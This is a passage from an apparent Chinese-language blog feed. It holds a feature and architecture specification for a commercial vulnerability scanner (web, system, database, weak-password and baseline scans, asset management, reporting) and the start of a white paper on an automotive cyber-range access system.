复正常访问，提高工作效率。</li><li>工具支持登录信息管理功能，可进行新增和删除系统登录信息，用户可以手动输入或也可以通过制定的格式文件批量导入登录信息，信息上传后，可通过工具的信息验证功能对登录信息进行批量验证，确保信息的准确性和安全性</li><li>工具提供了通过messager服务向被扫描目标发送提醒的功能，这样可以确保扫描过程中的通知和透明度。支持通过messager服务发送提醒给被扫描的目标。用户可以选择在扫描开始前、扫描过程中或扫描结束后发送提醒，以便目标方及时了解扫描情况并采取相应措施。这有助于提高双方的合作效率和信息透明度。</li><li>工具支持在漏洞报告上做出选择，用户可以选择最大限度报告漏洞，即使存在误报的风险，也会报告所有可能的漏洞；若关闭此功能，虽然准确率会有所提高，但也存在漏报的可能性</li><li>用户还可以选择是否执行所有规则的检测，若开启，工具将不考虑当前开启的服务，而是使用所有插件进行逐一检测，尽管这会耗费更多时间，但可能发现更多漏洞</li><li>工具提供了是否执行危险测试的选项，默认情况下是关闭的。如果用户选择开启，工具将执行一些可能对目标系统造成影响的危险测试，例如拒绝服务检测。</li><li>工具满足使用者根据需要选择要不要开启口令破解功能，若不需要则可以关闭，关闭该功能后，工具即不再启用其检测插件，停止执行弱口令相关检测插件，达到节约资源的目的。</li><li>工具还允许用户选择是否测试Oracle账号，关闭此选项后，Oracle口令破解的检测将不会执行。该工具提供选择是否测试Oracle账号的功能。关闭后，将不执行针对Oracle口令的破解测试。用户可以根据实际需求选择是否进行Oracle账号测试，以确保系统的安全性。</li><li>工具支持设置插件超时时间，以确保检测过程中的效率和资源的合理分配，用户可以根据实际情况设置合适的超时时间，以确保插件在规定时间内完成执行并避免长时间挂起。</li><li>用户可以设置单个主机检测的并发数，这有助于优化检测性能和网络负载，通过调整并发数，用户可以控制同时对多个主机进行检测的进程数量</li><li>工具允许用户设置单个扫描任务的并发主机数，从而在保证网络稳定性的同时，提高检测的并行性，用户可以根据实际需求设置并发主机数，以平衡扫描任务的执行时间和资源消耗。合理设置并发主机数可以提高扫描效率并减少等待时间。</li><li>工具支持设置单个主机TCP连接数，允许用户根据网络环境和主机性能调整连接数，通过调整TCP连接数，用户可以控制同时与目标主机建立的TCP连接数量。</li><li>工具支持和微软WSUS补丁系统联动，实现自动化的补丁修补。通过与WSUS集成，用户可以方便地获取、部署和管理补丁，提高系统的安全性。这使得用户可以方便地进行自动化的补丁修补，提高系统的安全性</li><li>工具支持多种认证机制，包括Cookie/Session认证、Form认证、Basic认证、NTLM认证、Digest认证和SSL证书认证，满足不同类型的登录需求，确保在进行扫描时能够模拟各种用户验证方式</li><li>可以设置起始URL、其他URL、网站域名以及扫描根目录中的例外URL，这些设置提供了对扫描范围的精确控制，允许用户指定和排除特定的网站路径</li><li>工具支持设置并发线程数，以控制同时进行的扫描任务的进程数量，使用户能够根据自己的系统资源和网络带宽调整扫描的并发性能</li><li>对URL的大小写敏感性是工具的另一个特点，它可以根据用户的需求区分URL中的字母大小写，以适应大小写敏感的服务器</li><li>工具允许用户设置引擎保留的相似链接的数量最大值，这有助于限制在扫描过程中处理的链接数量，同时确保不会遗漏重要的链接</li><li>在归并链接时，用户可以设置同一目录下需要保留的链接数量，这样可以减少冗余同时保留结构上重要的链接</li><li>如果遇到无法访问的链接，工具支持设置重试的次数，这有助于在网络不稳定或服务器不一致的情况下，确保链接得到充分检测</li><li>用户可以设置访问链接时的超时时间，以判定链接是否无法访问，这有助于提高扫描效率，避免在无的链接上浪费时间</li><li>工具支持设置单个网站扫描的超时时间，用户可以根据需要设置时间限制，或选择默认为0的无限制扫描，以确保对大型网站的彻底检查</li><li>对于需要通过代理访问的目标网站，工具提供了代理类型的选择，支持HTTP和SOCKS代理，以适应不同的网络环境和访问策略</li><li>暗链检测是工具的一个特色功能，它可以帮助用户发现网站中可能被隐藏的其他链接，暗链是指隐藏在网页中的不可见的链接，用于引导流量或传递权重等目的。通过暗链检测功能，用户可以发现并评估网站中存在的潜在风险。</li><li>工具具备网站木马检测的选项，即可以对网站的潜藏木马进行扫描检测，当开启检测功能后，工具将迅速对网站进行遍历，检测网站中是否存在恶意脚本，并返回检测结果，帮助用户及时发现和处理网站安全问题</li><li>用户可以设置检测深度，即爬虫在网站中爬取页面的深度，这允许用户根据自己的需求调整扫描的深度和广度</li><li>工具支持用户选择爬虫策略，包括广度优先和深度优先，这样用户可以根据目标网站的结构和扫描目的选择最合适的策略</li><li>工具支持设置HTTP请求头，即能够自定义请求头信息，通过引擎爬虫模拟浏览器的UserAgent，更好地与目标Web应用程序进行交互和模拟浏览行为，从而提高漏洞扫描的准确性和覆盖范围。</li><li>工具可以设置引擎爬虫模拟，指定爬虫的特定行为和特征，例如User-Agent、请求头、Cookie等，时要填充的表单内容，以提高漏洞扫描的准确性和可靠性，同时减少被目标网站识别为非法活动的风险。</li><li>用户可以设置爬取的最大页面数，当达到这个数值后，工具将停止爬取，这有助于控制扫描的范围和持续时间</li><li>对于页面大小的控制，工具允许用户设置爬取页面的最大KB数，如果页面大小超过用户设定的阈值，则放弃爬取，避免浪费资源在过大的资源上</li><li>工具可以通过设置额外URL，将特定的URL添加到扫描范围中，确保这些URL也被包含在扫描过程中。指定不想被爬取的URL关键字，如登出页面、危险操作或其他不需要进行检测的链接，以避免不必要的扫描和干扰，通过此设置能够提高扫描的效率和准确性</li><li>用户还可以设置额外文件类型，告诉引擎爬虫不对特定类型的链接进行爬取，这通常用于排除非文本链接，如多媒体文件或二进制数据，以聚焦于文本内容的安全检查</li><li>工具支持用户设置额外特定参数，以便于引擎在进行安全检测时，可以忽略那些用户定义为不需要检测的默认参数，这样可以减少误报，提高检测的准确性</li><li>工具提供口令猜解功能，默认是需要选择猜解服务的，用户可以根据需要选择猜解服务类型，支持多种服务同时选取，这大大增强了工具在口令安全方面的应用灵活性</li><li>工具具备弱口令检测功能，对于常见的服务如TELNET、FTP、SSH、POP3、SMB、SNMP、RDP、SMTP等都可以进行弱口令检测，技术员可通过此功能检测服务中可能存在的安全弱点</li><li>工具具备弱口令检测功能，对于常见的常见数据库如Oracle、MySQL、PostgreSQL、MsSQL、REDIS、DB2、MongoDB、Sybase、Informix等都可以进行弱口令检测，技术员可通过此功能检测数据库中可能存在的安全弱点</li><li>工具具备弱口令检测功能，对于常见的常见中间件如Tomcat、WebLogic、Jboss、WebSphere、GlassFish等都可以进行弱口令检测，技术员可通过此功能检测中间件中可能存在的安全弱点</li><li>工具具备弱口令检测功能，对于常见的常见HTTP服务类型如http-get、http-get-form、http-post-form、http-head、http-post等都可以进行弱口令检测，技术员可通过此功能检测http服务中可能存在的安全弱点</li><li>工具具备弱口令检测功能，对于常见的常见HTTPS服务类型如https-get、https-get-form、https-post-form、https-head、https-post等都可以进行弱口令检测，技术员可通过此功能检测https服务中可能存在的安全弱点</li><li>工具具备弱口令检测功能，对于常见的常见摄像头类型如大华、华为、宇视、海康等都可以进行弱口令检测，技术员可通过此功能检测摄像头中可能存在的安全弱点</li><li>在口令猜解策略方面，工具支持字典的标准模式和组合模式使用。标准模式允许用户分开选择用户名字典和密码字典，而组合模式则使用用户名密码组合字典，这样的灵活性能够满足不同复杂度的猜解需求</li><li>为了提高检测的效率，工具支持设置最大线程并发数，用户可以根据实际情况设置单个服务口令猜解的并发线程数，值越大，探测速度越快，但也要考虑到系统资源和网络带宽的限制</li><li>工具提供了在线下发任务和离线下发任务的能力，这意味着用户可以根据当前的网络条件和资源分配，灵活地选择任务下发方式</li><li>在创建安全基线检测任务时，工具支持手动添加、使用资产、批量添加三种方式，这样的多样化选择使得任务创建更为便捷和个性化</li><li>工具支持通过登录方式对Windows、Linux等操作系统进行漏洞安全基线检测，及检测其用户名、用户密码登信息登，这种深入检测方式能够更全面地评估操作系统的安全状态</li><li>为了符合各种安全规范的需求，工具支持移动、电信、公安部、工信部等多种安全配置规范，确保遵守相关的安全政策</li><li>工具支持通过制定的特定格式文件，批量录入登录信息，并进行一键批量验证，这大大提高了用户在进行大规模检测时的效率</li><li>针对主流数据库的漏洞进行了全面覆盖，可支持对以下数据库进行漏洞检测，包括Oracle、MySQL、Postgres、IBM DB2、MongoDB、SQLServer、Informix、Sybase等，通过不同数据库类型，配置相应的检测模板，即可完成检测，确保数据库安全的全面性</li><li>支持数据库登录扫描，用户可以设置目标地址、端口、数据库账号、密码、SID、数据库名称等登录选项，以进行针对性的数据库登录扫描，以确定要扫描的数据库服务器位置，检测可能存在的弱密码、默认凭据或其他安全漏洞，这使得扫描可以更精确地针对特定的数据库进行；</li><li>工具支持设置插件超时时间，如果插件在设定的时间内无法完成检测，则停止检测并收集已检测结果和进度，避免在某些耗时的插件上浪费时间</li><li>用户可以设置单个主机检测并发数，指定同时对单个检测目标进行检测的线程或进程数量，这样针对单个检测目标，提高扫描效率，加快对目标的检测速度</li><li>工具支持设置单个扫描任务并发主机数，即在单个扫描任务中，配置多个需要扫描的主机，就可以同时扫描多个主机，提高任务的执行效率</li><li>工具允许用户为每个被检测的主机设置TCP连接数，这样可以根据主机的处理能力和网络带宽，优化并发TCP连接的数量，确保扫描过程不会对目标主机造成过大压力</li><li>支持新增多种类型的扫描任务，包括系统扫描、Web扫描、数据库扫描、弱口令扫描和安全基线检测扫描任务。用户可以通过该项目进行全面的漏洞扫描和安全配置检查，评估目标主机、Web应用程序和数据库系统的安全性。此外，还支持独立的弱口令扫描任务下发，以提高系统和应用程序的安全性</li><li>根据对资源任务的不同需求，工具可以针对现有任务列表下的任意任务进行自由删除，这提供了更好的任务管理和资源分配</li><li>工具提供了编辑任务的功能，用户可以调整执行方式、策略和告警等选项，以适应不同的安全需求和扫描目标</li><li>工具支持针对已经新建的任务进行复制操作，快速生成一个相同任务的副本，复制出来的任务可以进行再编辑，包括任务名称和扫描目标的修改，可以根据需要修改任务名称以更好地标识任务的用途和目标，并对扫描目标进行添加、删除或修改，确保任务针对正确的目标进行扫描。这样的任务复制和编辑功能可以提高工作效率，管理多个相似的扫描任务执行</li><li>工具提供了任务分析功能，用户可以查看一个任务中包含的各种子任务类型，并能够了解到任务的当前状态。这包括区分任务是新增的，已经修复的，还是被标记为误报的，从而使得任务管理更加清晰和高效</li><li>对于系统扫描任务，工具提供了全面的监控视图，用户可以查看任务的执行状态、进度和预计剩余时间。此外，还可以查看详细的扫描结果，包括漏洞风险分布、被扫描主机的信息、漏洞列表、漏洞分类、漏洞数量、端口服务列表以及历史执行记录等，为用户提供了全面的安全视角</li><li>工具的Web扫描任务功能强大而全面，它允许用户实时监控任务的执行状态，包括了解任务的当前进度和预计的剩余完成时间。这种透明的进度跟踪机制使得用户能够有效地规划他们的工作流程。此外，用户可以深入查看扫描任务的详细结果，包括漏洞风险分布，这一点对于评估和优先处理安全威胁至关重要。用户还能获取网站的基本信息，漏洞列表以及这些漏洞的分类，这有助于用户了解潜在风险的性质和严重程度。漏洞的数量和目录树结构视图提供了一个直观的方式，以理解漏洞在网站结构中的分布。历史执行记录的查看功能则允许用户追踪安全漏洞随时间的变化趋势。最为重要的是，这个工具支持扫描过程及结果文件的下载，使用户能够进行取证分析，这些文件包括扫描结果、网站页面信息、请求和信息以及扫描日志等</li><li>工具的Web扫描任务功能强大而全面，它允许用户实时监控任务的执行状态，包括了解任务的当前进度和预计的剩余完成时间。这种透明的进度跟踪机制使得用户能够有效地规划他们的工作流程。此外，用户可以深入查看扫描任务的详细结果，包括漏洞风险分布，这一点对于评估和优先处理安全威胁至关重要。用户还能获取网站的基本信息，漏洞列表以及这些漏洞的分类，这有助于用户了解潜在风险的性质和严重程度。漏洞的数量和目录树结构视图提供了一个直观的方式，以理解漏洞在网站结构中的分布。端口服务列表可以查看到所扫描出来的端口有哪些，并对指定端口进行扫描。历史执行记录的查看功能则允许用户追踪安全漏洞随时间的变化趋势。最为重要的是，这个工具支持扫描过程及结果文件的下载，使用户能够进行取证分析，这些文件包括扫描结果、网站页面信息、请求和信息以及扫描日志等</li><li>支持安全基线检测任务，可以查看主机的配置合规信息和详情，安全基线检测通过比对主机配置与预定义的安全基线要求，评估主机系统是否符合安全标准，通过创建安全基线检测任务并选择目标主机，完成后可以查看主机的配置合规信息，包括不符合要求的具体配置项和修复建议</li><li>弱口令扫描任务功能让用户能够查看任务的执行状态、进度和预计剩余时间，并提供了对主机弱口令检测结果的详细视图，便于发现和修复潜在的密码安全问题</li><li>工具还支持实时查看所有当前正在执行的任务，这为用户提供了一个即时的任务监控平台，用户可以实时监控任务的执行状态，了解任务的进度和结果，以便对任务进行相应的管理和控制。</li><li>用户可以通过任务的时间、状态和关键词进行高级搜索，这大大提高了查找特定任务的效率，通过灵活的检索方式，用户可以更方便地管理和查找任务，提高工作效率。</li><li>工具支持导出功能，用户可以将已完成的任务报表导出，便于进行存档或向其他利益相关者报告。户可以将任务结果导出为报表文件，以便进一步分析、记录和共享。导出格式支持常见的文件格式，如Excel、PDF等，以满足不同用户的需求。</li><li>用户也可以在线查看已完成任务的报表，这为迅速回顾和分析提供了便利，用户可以在线浏览任务结果，无需下载文件即可获取任务数据。在线查看功能提供了便捷的报表浏览方式，使用户能够快速了解任务结果。</li><li>在资产管理方面，工具以树形结构展示资产，用户可以通过勾选来选择对特定资产进行操作，并能看到资产总数及各类型资产的数量，从而更好地组织和管理资产。</li><li>工具支持单独和批量增加资产，对于批量增加，用户可以上传包含指定格式信息的Excel文件，这样可以大幅提高资产录入的效率。</li><li>资产自动发现功能能够利用历史扫描过程中发现的主机信息，自动创建新的扫描任务，确保网络中的新资产得到及时的安全评估。</li><li>用户可以选择单独或批量删除资产，以便管理不再需要的或过时的资产，用户可以根据需要选择单个或多个资产进行删除操作，以清理不再需要的资产信息。批量删除功能可以快速清除大量无用资产，提高系统管理效率。</li><li>增加资产标签功能则进一步提高了资产管理的灵活性，允许用户为资产添加标签，便于后续的分类和检索，通过给资产打上相应的标签，用户可以更好地组织和管理资产，方便后续的查询和筛选操作。用户可以根据实际需求为资产设置不同的标签，以实现灵活的分类管理。</li><li>工具支持查看网络资产的详细信息，包括资产的IP地址、资产类型、所属资产组、所属用户、标签以及通过扫描发现的风险详情。这些信息的聚合视图为用户提供了一个全面的资产概览，有助于快速识别和潜在的安全风险。</li><li>用户可以利用多种搜索条件来定位特定的资产，包括字段搜索、操作系统类型、评分、MAC地址、所属资产组和标签等。这种灵活的搜索功能大大提高了用户在庞大的资产库中查找所需信息的效率。</li><li>工具支持导出Excel格式的自查信息列表，用户可以根据需要选择特定的资产来导出其详细信息。这一功能便于用户进行进一步的数据分析或为合规性审计准备文档。</li><li>用户可以根据自己的需求自定义资产组，并且系统提供了缺省的默认资产组。这样的自定义功能允许用户根据组织的特定结构和安全策略来组织资产。</li><li>对于资产组，工具提供了检索、编辑和删除的功能，使得资产组的管理变得简单而直观。用户可以轻松地更新资产组信息或者去除不再需要的资产组。</li><li>用户还可以新增资产组，并设置包括资产组名称、资产组范围和备注等内容。这种灵活性确保了资产组可以随着组织的变化而相应地调整。</li><li>工具支持一个庞大的系统漏洞库，包含180000条以上的漏洞记录，并且这些漏洞记录按照漏洞类别及威胁程度进行了详细分类。这一丰富的漏洞库确保了用户能够识别到最新的安全威胁。同时，支持的插件库搜索功能可以给出搜索范围提示，帮助用户更高效地查找所需的漏洞信息。</li><li>漏洞库的覆盖标准广泛，包含了CVE、CVSS、CNVD、CNNVD、CNCVE、Bugtraq编号等6种不同的安全漏洞标识，这样的国际化和标准化的漏洞信息有助于用户对漏洞进行准确评估和。</li><li>在操作系统的扫描方面，工具支持对包括Windows系列、Linux、AIX、HPUX、IRIX、BSD、Solaris等多种操作系统的目标主机进行全面的漏洞扫描。这确保了无论用户环境中运行的是哪种操作系统，工具都能提供有效的安全扫描。</li><li>对于网络设备，工具不仅限于一种设备，而是支持对Cisco、Juniper、华为、F5、Checkpoint等品牌的交换机、路由器等网络设备进行漏洞扫描。这种广泛的支持使得该工具能够在多样化的网络环境中发挥作用，帮助用户发现并修复网络设备的潜在漏洞。</li><li>在安全设备方面，本工具支持对Checkpoint、赛门铁克、Cisco、Juniper、Palo Alto、华为等主流厂商的防火墙和其他安全设备进行深入的漏洞扫描。这意味着无论企业选择哪种厂商的安全解决方案，本工具都能提供必要的安全评估，帮助识别和修复潜在的安全漏洞。</li><li>移动设备的安全同样不容忽视，该工具支持包括Android、iOS、BlackBerry、Windows Phone在内的各种移动操作系统的漏洞扫描。这确保了移动工作环境的安全性，保护企业免受移动设备相关安全威胁的侵害。</li><li>虚拟化技术的普及带来了新的安全挑战，本工具支持对VMware、KVM、XEN等主要的虚拟化平台进行漏洞扫描，帮助企业确保其虚拟化基础设施的安全。</li><li>国产化操作系统的支持反映了本工具对本土化需求的关注。支持对中科、redflag、linux系统作系统进行漏洞扫描，这对于遵守国家安全法规和推进国产软件的使用尤为重要。</li><li>数据库是企业信息系统的核心，本工具支持对包括但不限于人大金仓、南大通用、达梦等国产数据库的漏洞扫描，确保数据库的安全性和数据的完整性。</li><li>本工具支持自定义系统扫描模板，用户可以根据自己的需求设置模板的名字、查询条件和使用的漏洞插件。同时，工具提供了灵活性，允许用户删除不再需要的自定义插件模板。</li><li>Web漏洞扫描功能强化了对网络应用的安全检查，基于OWASP Top 10标准进行规则定义，确保了Web应用的安全性符合国际认可的安全最佳实践。</li><li>本工具支持自定义系统扫描模板，用户可以根据自己的需求设置模板的名字、查询条件和使用的漏洞插件。同时，工具提供了灵活性，允许用户删除不再需要的自定义插件模板。</li><li>为了适应不同的安全需求，系统预设了四种默认的扫描模板，分别针对高风险、高/中低风险、高/中/低风险和全部漏洞，以便用户根据自己的安全策略选择合适的扫描范围。</li><li>工具支持通过名称进行字典检索，这使得用户能够快速找到特定的漏洞或配置信息，提高了工作效率。</li><li>工具支持多种字典检测方式，包括默认的用户名字典检测、密码字典检测以及组合字典检测。这些检测方式有助于识别弱密码和常见的用户名和密码组合，从而减少因凭证安全不力导致的安全风险。</li><li>用户可以自定义用户名和密码列表，并将其导入工具进行检测。这一功能允许用户根据自己的实际需求进行更为精确的安全检查，特别是在已知特定凭证可能受到威胁的情况下。</li><li>本工具支持自定义基线策略，用户可以设定策略名称及查询条件。通过自定义基线策略，用户能够确保系统配置符合组织的安全要求和合规性标准。</li><li>工具内置了多种标准的基线核查模板，如等保三级检测要求、工信部配置规范、中国电信安全配置规范及中国移动安全配置规范等，这些模板帮助用户快速对照国家及行业标准进行安全核查；</li><li>工具提供了风险情况筛选查询功能，用户可以根据资产属性、资产组、漏洞等级、漏洞名称、漏洞类别、漏洞评分、端口等条件进行筛选，并将查询结果导出。这一功能便于用户进行资产风险管理和漏洞修复的优先级排序。</li><li>web漏洞扫描工具是一种功能强大的工具，提供了多种功能来帮助用户全面了解资产的漏洞情况。首先，用户可以通过该工具查看资产的历史漏洞变化趋势，了解漏洞数量的变化情况。工具还支持设置资产历史漏洞扫描任务，定期对资产进行扫描，可以查看每次扫描任务的结果，包括新增和减少的漏洞情况以及最近一次检测的时间。此外，该工具还具有对不同资产组资产总数和漏洞情况的对比统计功能，可以方便地比较不同资产组之间的安全状况差异。</li><li>报表是信息传达的重要工具，本工具支持五种常见的报表格式：Excel、Word、HTML、PDF、XML，满足不同场景下的报告需求。</li><li>用户可以自定义报表中的公司信息，使报表更加符合企业的品牌形象和内部报告要求。</li><li>工具不仅提供标准的导出功能，还支持用户自定义导出检测详情。这一高度的自定义性确保了用户可以根据自己的需求获取所需的信息。</li><li>用户可以根据漏洞的状态（新增、误报、已修复）筛选并导出报表，这有助于用户跟踪漏洞修复进度并管理安全漏洞的生命周期。</li><li>对于历史导出报表，工具提供了一个全面的总览功能，用户可以在一个统一的界面中查看所有生成的报表。这个总览界面不仅展示了每个报表的基本信息，如创建时间、报表类型等，还允许用户进行详细的查询和管理。</li><li>在报表的定制性方面，工具提供了高度的自定义选项。用户不仅可以根据需要选择要在报表中展示的漏洞等级和漏洞状态，还可以添加公司的相关信息，例如公司的名称、标志和其他企业身份元素，以确保报表符合公司的品牌标准和内部沟通要求。此外，用户还可以自定义报表的章节和布局。</li><li>提供license，包含数据库在内的功能。</li></ol><h4 id="技术实现内容-63"><a href="#技术实现内容-63" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-25"><a href="#软件方案-25" class="headerlink" title="软件方案"></a>软件方案</h5><p>1. 系统架构</p><p>本漏洞扫描工具采用B/S架构，以支持无客户端部署，通过Web界面管理所有操作。后端采用分布式系统设计，支持在多个数据中心中部署扫描引擎，实现负载均衡和高可用性。管理服务器将部署在主数据中心，扫描引擎可以部署在各个地理位置的数据中心中，以实现本地化扫描和数据隔离。</p><p>2. 系统部署</p><p>管理服务器：部署在机房A，负责策略下发、结果汇总、用户管理、日志记录等集中管理功能。</p><p>扫描引擎：分布式部署在机房B/C/D等，每个引擎可独立完成扫描任务。</p><p>3. 安全和认证</p><p>通过使用HTTPS协议加密的方式，针对所有不同Web管理界面进行信息安全加密。</p><p>支持多种认证方式，包括Cookie/Session、Form、Basic、NTLM、Digest和SSL证书认证。</p><p>4. 用户管理</p><p>支持自定义用户账号，包括系统管理员、配置管理员、审计管理员、报表管理员等角色。</p><p>用户信息包括用户名、权限模板、最近登录日期和时间、账号状态、登录超时时间等。</p><p>支持用户权限模板自定义，具体权限细节可查看。</p><p>5. 扫描功能</p><p>支持IPv4和IPv6环境的漏洞扫描。</p><p>支持自定义扫描任务，包括系统扫描、Web扫描、数据库扫描、弱口令扫描和安全基线检测。</p><p>支持多种扫描策略，包括危险测试、口令破解、规则检测等。</p><p>6. 通知与报告</p><p>检测完成后支持发送报告至指定邮箱、SNMP Trap、SYSLOG、FTP服务器。</p><p>支持自定义告警内容、方式和资产范围。</p><p>7. 系统维护与诊断</p><p>支持系统资源监控和告警设置。</p><p>提供PING、WGET、端口探测等基本诊断工具。</p><p>支持Tcpdump抓包功能。</p><p>支持一键诊断和修复常见问题。</p><p>8. 扩展性和兼容性</p><p>与微软WSUS补丁系统联动。</p><p>支持主流操作系统、网络设备、安全设备、移动设备、虚拟化环境、国产操作系统和数据库漏洞扫描。</p><p>9. 资产管理</p><p>支持资产自动发现、增加、删除和标签管理。</p><p>支持资产组的创建、编辑和删除。</p><p>支持资产风险情况筛选查询和导出。</p><p>10. 报表和审计</p><p>支持多种报表格式，包括Excel、Word、HTML、PDF、XML。</p><p>支持自定义报表内容和公司信息。</p><p>支持历史报表的查询和管理。</p><h5 id="工具功能-25"><a href="#工具功能-25" class="headerlink" title="工具功能"></a>工具功能</h5><p>1.用户和账号管理：</p><p>支持修改账号密码，保障账户安全性。</p><p>支持自定义创建账号，包含系统管理员、配置管理员、审计管理员、报表管理员四种用户角色。</p><p>提供用户信息查看，包括用户名、用户权限模板、最近登录日期和时间、账号状态、是否被锁定、登录超时时间等。</p><p>支持新增用户信息设置，如登录锁定次数、是否需要定期更换密码、最小密码长度、密码强度要求等。</p><p>支持自定义用户权限模板，包括报表管理员功能组、审计管理员功能组、普通管理员功能组等，并能查看权限模板详情。</p><p>2.扫描引擎和任务管理：</p><p>支持将当前设备设置为分布式引擎，并支持新增引擎地址、查看分布式引擎基本信息。</p><p>支持新增系统扫描、Web扫描、数据库扫描、弱口令、安全基线检测扫描任务，可独立弱口令扫描任务下发。</p><p>支持删除现有任务列表下的任意任务。</p><p>支持编辑任务的执行方式、策略、告警等选项。</p><p>支持任务复制功能，以快速生成相同任务，并支持编辑复制的任务。</p><p>3.诊断和维护工具：</p><p>支持PING、WGET、端口探测等基本诊断工具，确保网络畅通。</p><p>支持端口探测工具快速探测端口开放状态。</p><p>支持遍历数据包传输路径上的所有路由器。</p><p>支持通过Tcpdump进行抓包分析。</p><p>支持针对引擎、服务的常见问题，提供一键诊断和修复功能。</p><p>4.系统和服务配置：</p><p>支持界面配置反向支持端口，简化售后支持。</p><p>支持开启和关闭SSH服务，以及解锁SSH远程使用。</p><p>支持新增、删除系统登录信息，包括手动输入或批量导入，及登录信息的批量验证。</p><p>5.扫描策略和选项：</p><p>支持最大限度报告漏洞，选择是否报告所有可能存在的漏洞。</p><p>支持执行所有规则检测，不考虑开启的服务，挨个使用插件检测。</p><p>支持执行危险测试，如拒绝服务检测。</p><p>支持启用口令破解，进行弱口令相关检测。</p><p>支持测试Oracle账号的口令破解。</p><p>6.扫描引擎配置：</p><p>支持设置插件超时时间，避免长时间占用资源。</p><p>支持设置单个主机检测并发数，提升扫描效率。</p><p>支持设置单个扫描任务并发主机数，优化资源使用。</p><p>支持设置单个主机TCP连接数，保证连接稳定性。</p><p>7.漏洞扫描和补丁管理：</p><p>支持和微软WSUS补丁系统联动，自动化补丁修补。</p><p>8.认证和会话管理：</p><p>支持多种Web认证方式，如Cookie/Session、Form认证、Basic认证、NTLM认证、Digest认证和SSL证书认证。</p><p>9.Web扫描配置：</p><p>支持设置起始URL、其它URL、网站域名、扫描根目录例外url等。</p><p>支持设置并发线程数，优化扫描性能。</p><p>支持区分URL中的字母大小写，确保精确扫描。</p><p>支持设置引擎保留的相似链接数量最大值。</p><p>支持设置引擎在归并链接时，同一目录下需要保留的链接数量。</p><p>支持设置链接无法访问时的重试次数。</p><p>支持设置访问链接时的超时时间。</p><p>支持设置单个网站扫描的超时时间，默认为0限制。</p><p>10.代理和木马检测：</p><p>支持选择代理类型，包括HTTP和SOCKS，以便访问目标网站。</p><p>支持开启暗链检测，发现网站中的隐藏链接。</p><p>支持开启网站木马检测，检测恶意脚本。</p><p>11.爬虫和页面爬取配置：</p><p>支持设置检测深度，控制爬虫爬取页面的深度。</p><p>支持选择爬虫策略，广度优先或深度优先。</p><p>支持设置HTTP请求头，模拟浏览器的UserAgent。</p><p>支持设置爬虫模拟时填充的表单内容。</p><p>支持设置爬取的最大页面数。</p><p>支持设置爬取页面的最大KB数。</p><p>12.弱口令和服务检测：</p><p>支持选择口令猜解服务类型，支持多选。</p><p>支持多种服务和数据库的弱口令检测，如TELNET、FTP、SSH、Oracle、MySQL等。</p><p>支持常见摄像头类型的弱口令检测。</p><p>支持使用字典的标准模式和组合模式。</p><p>支持设置最大线程并发数，优化口令猜解速度。</p><p>13.任务下发和安全基线检测：</p><p>支持在线下发任务和离线下发任务。</p><p>支持手动添加、使用资产、批量添加创建安全基线检测任务。</p><p>支持对Windows、Linux等操作系统通过登录方式检测其漏洞安全基线。</p><p>14.安全配置规范和数据库漏洞检测：</p><p>支持移动、电信、公安部、工信部安全配置规范。</p><p>支持主流数据库漏洞的检测，如Oracle、MySQL、Postgres等。</p><p>支持数据库登录扫描，包括目标地址、端口、数据库账号等设置。</p><p>15.任务和报告管理：</p><p>支持查看任务种类、进行状态，区分新增、已修复、误报等状态。</p><p>支持查看不同类型任务的执行状态、进度、剩余时间、风险分布等。</p><p>支持查看所有正在执行的任务。</p><p>支持通过任务的时间、状态和关键词检索查找任务。</p><p>支持导出和在线查看已完成任务的报表。</p><p>16.资产管理和漏洞库：</p><p>支持以树形结构显示资产，进行操作和显示资产总数。</p><p>支持单独和批量增加资产，包括上传Excel格式文件。</p><p>支持资产自动发现功能。</p><p>支持单独和批量删除资产。</p><p>支持系统漏洞库，并按照漏洞类别及威胁程度分类。</p><p>17.兼容性和扫描模板：</p><p>支持各种操作系统、网络设备、安全设备、移动设备、虚拟化环境和数据库的漏洞扫描。</p><p>支持自定义系统扫描模板，包括自定义模板名字、查询条件和漏洞插件。</p><p>18.OWASP Top10和风险管理：</p><p>支持基于OWASP Top10标准进行Web漏洞扫描检测规则定义。</p><p>支持资产属性、资产组、漏洞等级等进行资产风险情况筛选查询并导出结果。</p><p>19.报表和统计：</p><p>支持常见报表格式，包括Excel、Word、HTML、PDF、XML。</p><p>支持自定义报表的公司信息。</p><p>支持自定义导出检测详情。</p><p>支持根据漏洞状态筛选导出报表。</p><p>支持历史导出报表的总览、查询及管理。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>接入系统白皮书</title>
      <link href="posts/81d7c15a/"/>
      <url>posts/81d7c15a/</url>
      
        <content type="html"><![CDATA[<p><strong>接入系统</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场安全特征采集设备 1</p><p>1.1 技术路线 1</p><p>1.1.1 靶场安全特征采集设备 1</p><p>2 智能汽车网络靶场车型测试台架 27</p><p>2.1 技术路线 27</p><p>2.1.1 产品外观 27</p><p>2.1.2 台架布线 31</p><p>2.1.3 台架面板 32</p><p>2.1.4 台架背面 38</p><p>2.1.5 BOB盒 43</p><p>2.1.6 电源管理模块 44</p><p>2.1.7 电源模块 45</p><p>2.1.8 程控上位机 351</p><p>3 智能汽车网络靶场零部件接入网关 355</p><p>3.1 技术路线 355</p><p>3.1.1 零部件接入网关 355</p><p>4 智能汽车网络靶场动态测试接入网关 409</p><p>4.1 技术路线 409</p><p>4.1.1 智能汽车网络靶场动态测试接入网关 409</p><p>4.1.2 车载无线通信网关 412</p><p>4.1.3 车载网络通信网关 416</p><p>4.1.4 调试桥网关 420</p><h1 id="智能汽车网络靶场安全特征采集设备"><a href="#智能汽车网络靶场安全特征采集设备" class="headerlink" title="智能汽车网络靶场安全特征采集设备"></a>智能汽车网络靶场安全特征采集设备</h1><h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="靶场安全特征采集设备"><a href="#靶场安全特征采集设备" class="headerlink" title="靶场安全特征采集设备"></a>靶场安全特征采集设备</h3><p>靶场安全特征采集设备系统架构图如下所示</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d1d9b710599268ef43e424909234191e.png"></p><h4 